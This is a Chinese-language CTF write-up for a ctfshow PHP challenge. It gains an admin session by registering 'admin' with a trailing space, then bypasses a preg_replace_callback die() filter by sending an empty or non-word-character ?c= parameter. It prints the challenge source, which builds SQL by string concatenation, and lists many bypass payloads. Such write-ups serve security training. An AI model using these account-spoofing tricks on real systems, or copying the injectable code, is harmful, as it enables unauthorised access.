
通过基础探测发现以下页面：

- `/` - 主页面 (index.php)

- `/login.php` - 登录页面

- `/register.php` - 注册页面

- `/config.php` - 配置文件 (无直接访问)

随便注册一个账号得到提示`注册成功,请勿注册同名账号(实在懒得写检测了)`
于是对admin尝试添加空格进行注册登陆
登陆后还是不能展示flag，阅读代码得知卡在`preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);`
我们需要让 preg_replace_callback 不执行回调函数，或者在执行回调函数之前就获取flag。
所以构造padload:`?c=`  空参数
则出现flag
ctfshow{9cd1abf2-f329-478b-9d72-febfceb6b81b}


----

          
让我详细分析这段代码和preg_replace_callback绕过方法。

## 代码分析

```php
<?php 
session_start(); 
include('config.php'); 
if(empty($_SESSION['name'])){ 
    show_source("index.php"); 
}else{ 
    $name=$_SESSION['name']; 
    $sql='select pass from user where name="'.$name.'"'; 
    echo $sql."<br />"; 
    system('4rfvbgt56yhn.sh'); 
    $query=mysqli_query($conn,$sql); 
    $result=mysqli_fetch_assoc($query); 
    if($name==='admin'){ 
        echo "admin!!!!!"."<br />"; 
        if(isset($_GET['c'])){ 
            preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1); 
            echo $flag; 
        }else{ 
            echo "you not admin"; 
        } 
    } 
} 
?>
```

## preg_replace_callback分析

这行代码的作用是：
```php
preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
```

### 正则表达式解释：
- `\w` 匹配任何字母、数字或下划线字符（等价于[a-zA-Z0-9_]）
- `\W*` 匹配任何非单词字符（除字母、数字或下划线外的字符）零次或多次
- 整体模式`/\w\W*/`会匹配一个单词字符后跟零个或多个非单词字符

### 函数作用：
1. 对`$_GET['c']`参数应用正则表达式`/\w\W*/`
2. 如果匹配成功，执行回调函数`function(){die("not allowed!");}`
3. 回调函数会立即终止脚本执行并输出"not allowed!"
4. 限制只处理第一个匹配项（第四个参数为1）

## 绕过方法

要绕过这个限制并获取flag，我们需要让`preg_replace_callback`不执行回调函数，或者在执行回调函数之前就获取flag。

### 方法1：使正则表达式不匹配

如果`$_GET['c']`参数不包含任何单词字符（字母、数字、下划线），则正则表达式不会匹配，回调函数也不会执行。

Payload示例：
```
?c=
?c= 
?c=%20%09%0a
?c=!!!
?c=@#$%^&*()
```

### 方法2：利用preg_replace_callback的特性

`preg_replace_callback`只有在找到匹配项时才会执行回调函数。如果我们传递一个空字符串或只包含非单词字符的字符串，就不会匹配，因此不会触发`die()`。

Payload示例：
```
?c=........
?c= 
?c=%00
?c=%20%20%20
```

### 方法3：在回调函数执行前获取flag

由于`echo $flag;`在`preg_replace_callback`之后，我们需要确保回调函数不终止脚本执行。

但实际上，一旦回调函数执行了`die()`，脚本就会立即终止，不会执行到`echo $flag;`。

所以关键是避免触发回调函数。

## 最有效的Payload

### 1. 空参数
```
?c=
```

### 2. 只包含特殊字符
```
?c=........
?c=---
?c=@@@
```

### 3. 空白字符
```
?c=%20
?c=%09
?c=%0a
```

### 4. 非单词字符组合
```
?c=!@#$%^&*()
?c=-><|}{][
```

## 完整攻击流程

1. 首先需要以admin身份登录或设置session：
   - 通过注册页面创建admin账户（如果可能）
   - 或者通过其他漏洞设置`$_SESSION['name']`为'admin'

2. 访问带有c参数的URL，但确保参数不触发正则表达式匹配：
   ```
   http://target/index.php?c=........
   ```

3. 如果成功绕过preg_replace_callback，将输出flag。

## 为什么这些方法有效？

1. **空参数**：正则表达式`/\w\W*/`需要至少一个单词字符才能匹配，空字符串不匹配任何内容。

2. **特殊字符**：只包含特殊字符（如点、破折号等）的字符串也不包含单词字符，因此不匹配。

3. **空白字符**：空格、制表符、换行符等都不是单词字符，所以也不会匹配。

## 其他可能的绕过方法

### 1. 利用编码
```
?c=%00
?c=%20%00
```

### 2. 利用多字节字符
```
?c=¡¢£¤¥¦§
```

### 3. 利用Unicode字符
```
?c=αβγδεζη
```

只要这些字符不包含单词字符（字母、数字、下划线），就不会触发正则表达式的匹配，从而避免执行回调函数。

## 防护建议

为了防止此类绕过，应该：
1. 使用更严格的输入验证
2. 不依赖正则表达式的不匹配来保护敏感操作
3. 在执行敏感操作前进行身份验证检查
4. 使用白名单而不是黑名单进行输入过滤
        